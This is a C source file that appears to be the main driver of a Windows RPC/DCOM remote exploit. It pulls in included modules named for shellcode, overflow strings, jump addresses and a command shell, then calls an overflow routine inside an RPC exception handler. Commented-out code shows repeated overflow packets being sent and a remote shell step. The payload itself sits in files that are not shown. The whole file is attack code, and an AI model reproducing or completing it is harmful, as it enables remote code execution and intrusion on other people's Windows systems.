#include <windows.h> 
#include <winsock.h>
#include <stdio.h>
#include <httpext.h>

//#include <stdio.h>
#include <objbase.h>
#include <objidl.h>
#include <wtypes.h>



#pragma  comment(lib,"ws2_32")

#include "ole32.h"
#include "ole32_c.c"
#pragma  comment(lib,"rpcrt4.lib")
#pragma  comment(lib,"Mpr.lib")
#pragma  comment(lib,"ole32.lib")

#include "main.h"
#include "jmpadd.h"
#include "..\rpc\inout.c"
#include "..\rpc\getvar.c"

#include "..\rpc\memory.c"
#include "..\rpc\cmd.c"
#include "..\rpc\sendrecv.c"
#include "..\rpc\over.c"
#include "getshellcode.c"
#include "..\rpc\overinfo.c"

#include "shellcode.c"

#include "getoverstr.c"



int main(int argc, char **argv)
{ 
  
  int     i,rpcexceptioncode;
  getvar(argc,argv);
//  fd=server_socket;
  
//  printinfo();


   RpcTryExcept
    {

      /* for(i=0;i<4;++i)
	   {
		   CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)sendoverpack,0,0,&j);  
		   Sleep(2000);
       } 	
	  */
	  	   over();

	  // shellcmd();
       if(overok!=0){
		   while(1) Sleep(0x7fffffff);
       }
    }
    RpcExcept ( 1 )
    {
        rpcexceptioncode = RpcExceptionCode();
        outprintf("RpcExceptionCode() = %d\r\n", rpcexceptioncode );
    }
    RpcEndExcept

    RpcStringFree( &string_binding );
    RpcBindingFree( &hello_if );
    return( EXIT_SUCCESS );
}  /* end of main */
/*

  over(fd);
  shellcmd(fd);

  closesocket(fd);
  WSACleanup( );
  return(0);
}
*/